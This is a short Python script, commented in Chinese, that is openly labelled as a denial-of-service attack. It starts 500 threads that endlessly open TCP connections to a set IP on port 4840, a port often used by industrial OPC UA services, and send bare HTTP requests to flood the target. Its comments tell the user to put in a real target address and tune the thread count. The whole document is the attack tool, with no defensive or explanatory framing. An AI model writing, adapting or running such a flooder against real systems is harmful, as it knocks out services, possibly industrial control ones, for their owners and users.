import socket
import threading

# 目标IP和端口
target_ip = '10.4.3.195'  # 替换为实际的目标IP
target_port = 4840  # 替换为实际的目标端口

# DoS攻击函数
def dos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
            s.close()
        except Exception as e:
            print(f"An error occurred: {e}")

# 创建多个线程进行攻击
threads = []
for i in range(500):  # 你可以调整线程的数量
    thread = threading.Thread(target=dos_attack)
    threads.append(thread)
    thread.start()

# 等待所有线程完成
for thread in threads:
    thread.join()
